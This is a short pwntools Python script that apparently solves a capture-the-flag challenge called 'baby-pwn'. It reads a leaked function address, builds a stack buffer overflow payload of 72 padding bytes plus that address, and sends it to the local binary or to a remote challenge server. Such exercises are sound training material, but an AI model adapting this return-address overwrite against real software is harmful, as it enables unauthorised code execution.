#!/usr/bin/env python3

from pwn import *

EXE = ELF("./baby-pwn")

print(EXE.path)
if args.REMOTE:
    r = remote("34.162.142.123", 5000)
elif args.GDB:
    r = gdb.debug(EXE.path, "b vulnerable_function")
else:
    r = process(EXE.path)

r.recvuntil(b"Address of secret: ")
secret = r.recvline()
secret = int(secret, 16)
log.success(f"Secret address: {hex(secret)}")

r.recvuntil(b"Enter some text: ")

offset = 72
payload = b"A" * offset + p64(int(secret))

log.info("Sending payload")

r.sendline(payload)

r.interactive()
